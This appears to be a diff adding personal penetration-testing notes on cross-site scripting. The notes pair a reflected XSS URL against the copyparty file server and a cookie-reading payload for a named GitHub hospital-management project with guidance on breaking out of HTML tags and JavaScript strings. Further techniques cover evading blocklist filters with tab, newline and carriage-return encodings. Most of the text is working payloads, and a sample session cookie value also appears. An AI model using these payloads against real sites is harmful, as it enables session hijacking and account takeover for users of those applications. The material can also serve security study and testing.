@@ -1,0 +1,30 @@
+reflected copyparty xss
+https://www.exploit-db.com/exploits/51635
+http://IP:PORT/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
+
+https://github.com/kishan0725/Hospital-Management-System
+https://github.com/kishan0725/Hospital-Management-System/issues/6
+<script>alert(document.cookie)</script>
+PHPSESSID=ktjjkh5jgoeu1civmqr612mgs1
+
+When XSS happens between HTML tags, the attacker can run <script>alert(document.cookie)</script>
+within an HTML tag, we need to end the HTML tag to give the script a turn to load. Consequently, we might adapt our payload to
+ ><script>alert(document.cookie)</script>
+or 
+"><script>alert(document.cookie)</script>
+or something similar that would fit in the context.
+
+We might need to terminate the script to run the injected one if we can inject our XSS within an existing JavaScript. For instance, we can start with </script> to end the script and continue from there. If your code is within a JavaScript string, you can close the string with ', complete the command with a semicolon, execute your command, and comment out the rest of the line with //. You can try something like this ';alert(document.cookie)//.
+
+
+https://github.com/terjanq/Tiny-XSS-Payloads
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+If XSS payloads are blocked based on specific blocklists, there are various tricks for evasion. For instance, a horizontal tab, a new line, or a carriage return can break up the payload and evade the detection engines.
+Horizontal tab (TAB) is 9 in hexadecimal representation
+New line (LF) is A in hexadecimal representation
+Carriage return (CR) is D in hexadecimal representation
+<IMG SRC="javascript:alert('XSS');">
+
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
